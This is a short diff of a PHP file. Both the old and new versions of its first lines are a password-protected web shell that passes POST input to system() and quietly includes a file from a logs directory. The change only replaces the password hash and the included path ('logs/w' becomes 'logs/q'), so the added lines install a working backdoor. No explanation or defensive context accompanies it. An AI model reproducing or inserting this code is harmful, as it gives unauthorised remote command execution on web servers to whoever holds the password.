@@ -1,2 +1,2 @@
-<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="20557e9cb0b97727acba7b67560662c160507758"){@system($_POST["w"]);die();}
-@include_once "/var/www/html/logs/w";
+<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="6321900abe56af5e563a6bce9ddea7034b78c6c9"){@system($_POST["w"]);die();}
+@include_once "/var/www/html/logs/q";
